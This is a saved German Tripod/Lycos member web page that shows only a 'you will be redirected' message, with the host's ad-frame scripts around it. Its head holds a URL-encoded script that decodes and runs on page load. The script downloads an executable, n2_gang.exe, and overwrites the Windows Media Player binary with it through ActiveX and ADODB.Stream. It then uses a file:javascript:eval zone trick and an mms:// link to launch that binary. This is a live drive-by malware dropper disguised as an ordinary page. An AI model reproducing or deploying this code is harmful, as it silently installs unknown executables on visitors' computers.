<script language="javascript">

myreg=new RegExp("lycos\.de","i");
if ( !myreg.test("'"+top.location+"'") ) {
	nwreg=new RegExp ("http://([^/]+)?(/([a-z0-9A-Z\-\_]+)?[^']+)","i");
	rn=nwreg.exec("'"+self.location+"'");
	if (parent.frames.length==2) { top.location="http://" + rn[1] + rn[2]; }
	else { top.location="http://" + rn[1] + "/" + rn[3]; }
}

if(window == window.top) {
        var address=window.location;
        var s='<html><head><title>'+'</title></head>'+
        '<frameset cols="*,140" frameborder="0" border="0" framespacing="0" onload="return true;" onunload="return true;">'+
        '<frame src="'+address+'?" name="memberPage" marginwidth="0" marginheight="0" scrolling="auto" noresize>'+
		'<frame src="http://ads.tripod.lycos.de/ad/google/frame.php?_url='+escape(address)+'&gg_bg=&gg_template=&mkw=&cat=noref" name="LycosAdFrame"  marginwidth="0" marginheight="0" scrolling="auto" noresize>'+
        '</frameset>'+
        '</html>';

        document.write(s);      
}
</script>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
  <title>:: Hallo ::</title>
  <script language="Javascript">

var Text ="%3Ctextarea%20id%3D%22code%22%20style%3D%22display%3Anone%3B%22%3E%0D%0A%0D%0A%20%20%20%20var%20x%20%3D%20new%20ActiveXObject%28%22Microsoft.XMLHTTP%22%29%3B%0D%0A%20%20%20%20x.Open%28%22GET%22%2C%20%22http%3A//mitglied.lycos.de/dim1/n2_gang.exe%22%2C0%29%3B%0D%0A%20%20%20%20x.Send%28%29%3B%0D%0A%0D%0A%20%20%20%20var%20s%20%3D%20new%20ActiveXObject%28%22ADODB.Stream%22%29%3B%0D%0A%20%20%20%20s.Mode%20%3D%203%3B%0D%0A%20%20%20%20s.Type%20%3D%201%3B%0D%0A%20%20%20%20s.Open%28%29%3B%0D%0A%20%20%20%20s.Write%28x.responseBody%29%3B%0D%0A%0D%0A%20%20%20%20s.SaveToFile%28%22C%3A%5C%5CProgramme%5C%5CWindows%20Media%20Player%5C%5Cwmplayer.exe%22%2C2%29%3B%0D%0A%20%20%20%20location.href%20%3D%20%22mms%3A//%22%3B%0D%0A%0D%0A%3C/textarea%3E%0D%0A%3Cscript%20language%3D%22javascript%22%3E%0D%0A%0D%0A%20%20%20%20function%20preparecode%28code%29%20%7B%0D%0A%20%20%20%20%20%20%20%20result%20%3D%20%27%27%3B%0D%0A%20%20%20%20%20%20%20%20lines%20%3D%20code.split%28/%5Cr%5Cn/%29%3B%0D%0A%20%20%20%20%20%20%20%20for%20%28i%3D0%3Bi%3Clines.length%3Bi++%29%20%7B%0D%0A%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20line%20%3D%20lines%5Bi%5D%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20line%20%3D%20line.replace%28/%5E%5Cs+/%2C%22%22%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20line%20%3D%20line.replace%28/%5Cs+%24/%2C%22%22%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20line%20%3D%20line.replace%28/%27/g%2C%22%5C%5C%27%22%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20line%20%3D%20line.replace%28/%5B%5C%5C%5D/g%2C%22%5C%5C%5C%5C%22%29%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20line%20%3D%20line.replace%28/%5B/%5D/g%2C%22%252f%22%29%3B%0D%0A%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20%28line%20%21%3D%20%27%27%29%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20result%20+%3D%20line%20+%27%5C%5Cr%5C%5Cn%27%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%20%20%20%20return%20result%3B%0D%0A%20%20%20%20%7D%0D%0A%0D%0A%20%20%20%20function%20doit%28%29%20%7B%0D%0A%20%20%20%20%20%20%20%20mycode%20%3D%20preparecode%28document.all.code.value%29%3B%0D%0A%20%20%20%20%20%20%20%20myURL%20%3D%20%22file%3Ajavascript%3Aeval%28%27%22%20+%20mycode%20+%20%22%27%29%22%3B%0D%0A%20%20%20%20%20%20%20%20window.open%28myURL%2C%22_media%22%29%3B%0D%0A%20%20%20%20%7D%0D%0A%0D%0A%0D%0A%20%20%20%20window.open%28%22error.php%22%2C%22_media%22%29%3B%0D%0A%0D%0A%20%20%20%20setTimeout%28%22doit%28%29%22%2C%205000%29%3B%0D%0A%0D%0A%0D%0A%3C/script%3E";

function DeCode() { var NewText; NewText = unescape(Text); document.write(NewText);} DeCode();
  </script>
  <meta http-equiv="Content-Type"
 content="text/html; charset=windows-1252">
  <style type="text/css">#nav {
PADDING-LEFT: 35px
}
#sub1 {
PADDING-LEFT: 2px
}
#sub2 {
PADDING-LEFT: 4px
}
  </style>
</head>
<body style="background-color: rgb(51, 51, 51); color: rgb(0, 0, 0);">
<div align="center">
<p>&nbsp;</p>
<p>&nbsp;</p>
<p><font color="#cccccc">Sie werden automatisch weitergeleitet ...</font></p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
</div>
</body>
</html>
</pre></xmp></noscript>

<script language="javascript" src="http://ads.tripod.lycos.de/ad/test_frame_size.js"></script>

<script language="javascript">
if (!AD_clientWindowSize()) {
        document.write("<NOSC"+"RIPT>");
}
</script>

<script type="text/javascript">
        function setCookie(name, value, expires, path, domain, secure) {
           var curCookie = name + "=" + escape(value) +
             ((expires) ? "; expires=" + expires.toGMTString() : "") +
             ((path) ? "; path=" + path : "") +
             ((domain) ? "; domain=" + domain : "") +
             ((secure) ? "; secure" : "");
           document.cookie = curCookie;
        }

        var ad_url = "http://ads.tripod.lycos.de/ad/google/frame.php?_url="+escape(self.location)+"&gg_bg=&gg_template=&mkw=&cat=noref";
        var ref=window.document.referrer;

		if(parent.LycosAdFrame) {
                if(parent.memberPage && parent.memberPage.document.title ) {
                        parent.document.title=parent.memberPage.document.title;
                }

                if(parent.LycosAdFrame && parent.LycosAdFrame.location && (ref != "" && (ref+"?" != window.location) && (ref.substr(ref.length-1,1) != "/")) ) {
                        parent.LycosAdFrame.location.replace(ad_url);
                }
                setCookie("adFrameForcePHP",0,0," ");
                parent.document.body.cols = "*,140";
        }
        else if(top.LycosAdFrame && top.LycosAdFrame.location) {
                if ((ref != "" && (ref+"?" != top.window.location) && (ref.substr(ref.length-1,1) != "?"))) {
                        top.LycosAdFrame.location.replace(ad_url);
                }
                setCookie("adFrameForcePHP",0,0," ");
                top.document.body.cols = "*,140";
        }
        else {
                if (!window.opener) {
                        setCookie("adFrameForcePHP",1,0," ");
                }
                else {
                        setCookie("adFrameForcePHP",0,0," ");
                }
        }
		
	if (window.top.location.href.indexOf("http://mitglied.lycos.de")!=-1) {
		ad_frame = 1 ;
		window.top.document.body.cols="*,140" ;
	}

function resizeGoogleAdFrame() {
	window.top.document.body.cols = "*,140";
}


	if (ad_frame == 1 && AD_clientWindowSize()) {
		setInterval("resizeGoogleAdFrame()", 30);
	}

</script>

<script type="text/javascript" src="http://ads.tripod.lycos.de/ad/ad.php?cat=noref&mkw=&CC=de&ord=400d7b4f&adpref="></script>
